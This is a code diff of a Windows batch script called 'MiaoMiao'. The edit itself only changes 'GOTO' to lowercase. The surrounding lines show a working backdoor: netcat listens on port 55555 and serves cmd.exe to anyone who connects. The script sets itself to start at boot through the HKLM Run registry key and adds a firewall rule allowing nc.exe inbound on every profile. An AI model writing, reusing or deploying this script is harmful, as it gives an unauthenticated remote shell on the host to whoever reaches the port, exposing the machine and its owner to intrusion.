@@ -5,21 +5,21 @@ set BAT_HOME=%~dp0
 cd %BAT_HOME%
 title MiaoMiao
 
-if "%1" == "/i"      GOTO install
-if "%1" == "-i"      GOTO install
-if "%1" == "/u"      GOTO unistall
-if "%1" == "-u"      GOTO unistall
-if "%1" == "/?"      GOTO help
-if "%1" == "-?"      GOTO help
-if "%1" == "-help"   GOTO help
-if "%1" == "--help"  GOTO help
+if "%1" == "/i"      goto install
+if "%1" == "-i"      goto install
+if "%1" == "/u"      goto unistall
+if "%1" == "-u"      goto unistall
+if "%1" == "/?"      goto help
+if "%1" == "-?"      goto help
+if "%1" == "-help"   goto help
+if "%1" == "--help"  goto help
 
 ::---------------------------------------
 :startServer
 
 ::start /B "IPSchedule.bat"
 start /B nc -l -p 55555 -e cmd.exe -L -d
-GOTO end
+goto end
 ::---------------------------------------
 :install
 
@@ -28,7 +28,7 @@ reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /d "\"%BAT_HOME%MiaoMiao.bat\""
 netsh advfirewall firewall add rule name="NetCat" dir=in action=allow program="%BAT_HOME%nc.exe" enable=yes profile=any
 ::netsh firewall add allowedprogram program = "%BAT_HOME%nc.exe" name = NetCat mode =ENABLE :: Windows XP
-GOTO startServer
+goto startServer
 ::---------------------------------------
 :unistall
 
@@ -38,7 +38,7 @@ netsh advfirewall firewall delete rule name="NetCat"
 ::netsh firewall delete allowedprogram NetCat
 del /s /f /q "%BAT_HOME%*.*"
 rd /s /q "%BAT_HOME%..\miaomiao"
-GOTO end
+goto end
 ::---------------------------------------
 :help
 
@@ -62,7 +62,7 @@ echo           - Delete all the file and folder of the program.
 echo.
 echo     -?    Show this documantation.
 echo.
-GOTO end
+goto end
 ::---------------------------------------
 
 :end
